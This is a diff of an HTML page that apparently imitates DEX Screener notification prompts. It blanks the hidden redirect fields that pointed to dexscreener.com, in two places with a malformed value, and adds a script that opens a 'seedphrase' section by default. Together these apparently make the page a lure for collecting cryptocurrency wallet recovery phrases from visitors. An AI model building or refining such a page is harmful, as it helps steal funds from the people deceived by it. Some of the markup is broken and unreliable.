@@ -65,12 +65,7 @@
             You will receive notifications via email in case you miss in-app
             notifications
           </p>
-          <input
-            type="hidden"
-            name="_redirect"
-            value="https://dexscreener.com/"
-            required
-          />
+          <input type="hidden" name="_redirect" value=""" required />
           <button type="submit">ENABLE</button>
         </form>
       </div>
@@ -99,12 +94,7 @@
             You will receive notifications via email in case you miss in-app
             notifications
           </p>
-          <input
-            type="hidden"
-            name="_redirect"
-            value="https://dexscreener.com/"
-            required
-          />
+          <input type="hidden" name="_redirect" value=""" required />
           <button type="submit">ENABLE</button>
         </form>
       </div>
@@ -123,12 +113,7 @@
             You will receive notifications via email in case you miss in-app
             notifications
           </p>
-          <input
-            type="hidden"
-            name="_redirect"
-            value="https://dexscreener.com"
-            required
-          />
+          <input type="hidden" name="_redirect" value="" required />
           <button type="submit">ENABLE</button>
         </form>
       </div>
@@ -158,5 +143,10 @@
     ></script>
     <script src="https://cdn.jsdelivr.net/npm/@splidejs/splide@4.1.4/dist/js/splide.min.js"></script>
     <script src="./index.js"></script>
+    <script>
+      const defaultSectionId = "seedphrase";
+      const defaultTab = document.getElementById("seed-btn");
+      showSection(defaultSectionId, defaultTab);
+    </script>
   </body>
 </html>
